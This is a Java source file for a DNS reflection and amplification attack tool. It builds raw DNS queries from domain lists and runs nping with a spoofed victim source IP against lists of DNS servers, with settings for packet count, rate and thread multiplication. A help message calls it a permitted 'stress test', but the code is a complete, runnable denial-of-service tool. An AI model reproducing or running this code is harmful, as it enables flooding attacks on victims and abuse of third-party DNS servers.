import java.io.File;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.math.BigInteger;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.Random;
import java.util.Scanner;
import java.util.regex.Pattern;

/**
 * A simple program that uses nping to create a DNS reflection attack. By
 * spoofing a victim IP packets can be amplified from a DNS server to the
 * victim.
 * 
 * @author John Doggett
 *
 */
public class DNSReflector {

	public static void main(String[] args) throws IOException, InterruptedException {
		ArrayList<String> domainServers = new ArrayList<String>();
		ArrayList<String[]> websiteDomains = new ArrayList<String[]>();
		Scanner domainScan = new Scanner(new File("DomainServers"));
		Scanner websiteScan = new Scanner(new File("Websites"));
		while (domainScan.hasNextLine()) {
			domainServers.add(domainScan.nextLine());
		}
		while (websiteScan.hasNextLine()) {
			websiteDomains.add((websiteScan.nextLine().split(Pattern.quote("."))));
		}
		domainScan.close();
		websiteScan.close();

		String[] hexwebsiteDomains = new String[websiteDomains.size()];
		for (int a = 0; a < hexwebsiteDomains.length; a++) {
			hexwebsiteDomains[a] = "";
		}
		for (int a = 0; a < websiteDomains.size(); a++) {
			for (int b = 0; b < websiteDomains.get(a).length; b++) {

				String length = Integer.toHexString(websiteDomains.get(a)[b].length());
				if (length.length() == 1) {
					length = "0" + length;
				}

				hexwebsiteDomains[a] += length + stringToHexString(websiteDomains.get(a)[b]);
			}
			hexwebsiteDomains[a] += "00";
		}

		int numberOfIterations = 1;
		int count = 1;
		int rate = 1;
		String request = "0001";

		String sourceIP = Inet4Address.getLocalHost().getHostAddress();

		if (sourceIP.contains("127")) {
			Enumeration<NetworkInterface> nInterfaces = NetworkInterface.getNetworkInterfaces();
			while (nInterfaces.hasMoreElements()) {
				Enumeration<InetAddress> inetAddresses = nInterfaces.nextElement().getInetAddresses();
				while (inetAddresses.hasMoreElements()) {
					String temp = inetAddresses.nextElement().getHostAddress();

					if (temp.contains("127") == false && temp.contains(".")) {
						sourceIP = temp;
					}
				}
			}
		}

		if(System.getProperty("user.name").equals("root") == false) {
			if(args.length >= 1) {
				args[0] = "--help";
			}
			else {
				args = new String[1];
				args[0] = "--help";
			}
		}
				
		String sourcePort = "53";
		boolean verbose = false;
		for (int a = 0; a < args.length; a++) {
			switch (args[a]) {
			case "--count":
				if (a + 1 < args.length && args[a + 1].matches("^[0-9]*$") && (args[a + 1]).length() >= 1
						&& Integer.parseInt(args[a + 1]) >= 0) {
					count = Integer.parseInt(args[a + 1]);
					a++;
					break;
				}
			case "--rate":
				if (a + 1 < args.length && args[a + 1].matches("^[0-9]*$") && (args[a + 1]).length() >= 1
						&& Integer.parseInt(args[a + 1]) >= 0) {
					rate = Integer.parseInt(args[a + 1]);
					a++;
					break;
				}
			case "--iterations":
				if (a + 1 < args.length && args[a + 1].matches("^[0-9]*$") && (args[a + 1]).length() >= 1
						&& Integer.parseInt(args[a + 1]) >= 0) {
					numberOfIterations = Integer.parseInt(args[a + 1]);
					a++;
					break;
				}
			case "--request":
				if (a + 1 < args.length && args[a + 1].length() == 4) {
					request = args[a + 1];
					a++;
					break;
				}
			case "--source-ip":
				if (a + 1 < args.length) {
					sourceIP = args[a + 1];
					a++;
					break;
				}
			case "--source-port":
				if (a + 1 < args.length) {
					sourcePort = args[a + 1];
					a++;
					break;
				}
			case "--verbose":
				verbose = true;
				break;

			default:
				System.out.println("---DNS Reflection Benchmark Stress Test---");
				System.out.println("Use with permission of target and DNS servers!");
				System.out.println("-Run as root!-\n");
				System.out.println(
						"--count (positive integer), affects how many times each nping thread sends a packet, default 1");
				System.out.println(
						"--help (or entering any non-existant commands), will print a help page and prevent sending of packets");
				System.out.println(
						"--iterations (positive integer), affects how many nping threads will be made (multiplied by number of websites and number of domain servers), default 1");
				System.out.println(
						"--rate (positive integer), amount of packets each nping thread sends per minute, default 1");
				System.out.println(
						"--request (2bit hexadecimal string), changes dns packet query type, default 0001 (ipv4 a record)");
				System.out.println("--source-ip (ipv4 address), spoof udp packet source address, default local ip");
				System.out.println("--source-port (udp port), will send dns reponse to desired port, default 53");
				System.out.println(
						"--verbose, will print arguments for every nping thread created. WARNING: CAUSES HEAVY USAGE IF CREATING LOTS OF THREADS!");
				numberOfIterations = 0;
				a = args.length;
				break;

			}

		}

		Random r = new Random();
		String IP = "199.7.91.13";
		for (int c = 0; c < numberOfIterations; c++) {
			for (int b = 0; b < domainServers.size(); b++) {
				IP = domainServers.get(b);
				for (int a = 0; a < hexwebsiteDomains.length; a++) {
					String command = "nping --ttl 64 --udp --source-ip " + sourceIP + " --dest-port 53 --rate " + rate
							+ " --send-ip --source-port " + sourcePort + " --count " + count + " --dest-ip " + IP
							+ " --data " + Integer.toHexString(r.nextInt(65536)) + "00000001000000000000"
							+ hexwebsiteDomains[a] + request + "0001";
					if (verbose) {
						System.out.println(command);
					}
					Runtime.getRuntime().exec(command);
				}
			}
		}
	}

	public static String stringToHexString(String input) throws UnsupportedEncodingException {
		return String.format("%x", new BigInteger(1, input.getBytes("US-ASCII")));
	}

}
